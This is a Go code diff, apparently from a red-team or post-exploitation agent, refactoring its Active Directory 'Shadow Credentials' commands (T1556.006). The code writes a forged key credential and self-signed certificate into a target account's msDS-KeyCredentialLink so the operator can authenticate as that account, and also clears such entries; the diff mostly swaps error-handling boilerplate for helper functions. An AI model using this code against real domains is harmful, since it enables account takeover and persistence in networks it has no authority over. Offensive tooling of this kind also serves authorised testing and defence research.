@@ -171,50 +171,30 @@ func buildKeyCredential(pub *rsa.PublicKey) ([]byte, []byte, error) {
 // ldapShadowCred writes a KEY_CREDENTIAL to msDS-KeyCredentialLink
 func ldapShadowCred(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.CommandResult {
 	if args.Target == "" {
-		return structs.CommandResult{
-			Output:    "Error: -target (account to add shadow credential to) is required",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: -target (account to add shadow credential to) is required")
 	}
 
 	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error resolving target: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error resolving target: %v", err)
 	}
 
 	// Generate RSA 2048 key pair
 	privateKey, err := rsa.GenerateKey(rand.Reader, 2048)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error generating RSA key pair: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error generating RSA key pair: %v", err)
 	}
 
 	// Build KEY_CREDENTIAL structure
 	credential, deviceID, err := buildKeyCredential(&privateKey.PublicKey)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error building KEY_CREDENTIAL: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error building KEY_CREDENTIAL: %v", err)
 	}
 
 	// Create self-signed X.509 certificate for PKINIT usage
 	serialNumber, err := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error generating serial number: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error generating serial number: %v", err)
 	}
 
 	certTemplate := &x509.Certificate{
@@ -230,11 +210,7 @@ func ldapShadowCred(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.
 
 	certDER, err := x509.CreateCertificate(rand.Reader, certTemplate, certTemplate, &privateKey.PublicKey, privateKey)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error creating certificate: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error creating certificate: %v", err)
 	}
 
 	// Format DN-Binary value: B:<hexlen>:<hex>:<ownerDN>
@@ -253,11 +229,7 @@ func ldapShadowCred(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.
 		if strings.Contains(err.Error(), "unwilling") || strings.Contains(err.Error(), "Unwilling") {
 			errMsg += "\n[!] DC may not support Key Trust. Requires Windows Server 2016+ domain functional level."
 		}
-		return structs.CommandResult{
-			Output:    errMsg,
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult(errMsg)
 	}
 
 	// Encode certificate and private key as PEM
@@ -271,6 +243,8 @@ func ldapShadowCred(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.
 		Type:  "RSA PRIVATE KEY",
 		Bytes: keyDER,
 	})
+	structs.ZeroBytes(keyDER)
+	structs.ZeroBytes(credential)
 
 	return structs.CommandResult{
 		Output: fmt.Sprintf("[*] Shadow Credentials — msDS-KeyCredentialLink (T1556.006)\n"+
@@ -298,20 +272,12 @@ func ldapShadowCred(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.
 // ldapClearShadowCred removes all KEY_CREDENTIAL values from msDS-KeyCredentialLink
 func ldapClearShadowCred(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.CommandResult {
 	if args.Target == "" {
-		return structs.CommandResult{
-			Output:    "Error: -target (account to clear shadow credentials from) is required",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: -target (account to clear shadow credentials from) is required")
 	}
 
 	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error resolving target: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error resolving target: %v", err)
 	}
 
 	// First check if the attribute has values
@@ -327,11 +293,7 @@ func ldapClearShadowCred(conn *ldap.Conn, args ldapWriteArgs, baseDN string) str
 
 	result, err := conn.Search(searchReq)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error reading msDS-KeyCredentialLink: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error reading msDS-KeyCredentialLink: %v", err)
 	}
 
 	var existingCount int
@@ -340,13 +302,9 @@ func ldapClearShadowCred(conn *ldap.Conn, args ldapWriteArgs, baseDN string) str
 	}
 
 	if existingCount == 0 {
-		return structs.CommandResult{
-			Output: fmt.Sprintf("[*] Shadow Credentials — msDS-KeyCredentialLink\n"+
+		return successf("[*] Shadow Credentials — msDS-KeyCredentialLink\n"+
 				"[+] Target: %s\n"+
-				"[+] Status: No key credentials found (attribute empty)\n", targetDN),
-			Status:    "success",
-			Completed: true,
-		}
+				"[+] Status: No key credentials found (attribute empty)\n", targetDN)
 	}
 
 	// Clear by replacing with empty value list
@@ -354,21 +312,13 @@ func ldapClearShadowCred(conn *ldap.Conn, args ldapWriteArgs, baseDN string) str
 	modReq.Replace("msDS-KeyCredentialLink", []string{})
 
 	if err := conn.Modify(modReq); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error clearing msDS-KeyCredentialLink: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error clearing msDS-KeyCredentialLink: %v", err)
 	}
 
-	return structs.CommandResult{
-		Output: fmt.Sprintf("[*] Shadow Credentials Cleared\n"+
+	return successf("[*] Shadow Credentials Cleared\n"+
 			"[+] Target:  %s\n"+
 			"[+] Removed: %d key credential(s)\n"+
-			"[+] Server:  %s\n", targetDN, existingCount, args.Server),
-		Status:    "success",
-		Completed: true,
-	}
+			"[+] Server:  %s\n", targetDN, existingCount, args.Server)
 }
 
 // extractDomain extracts a domain name from a distinguished name
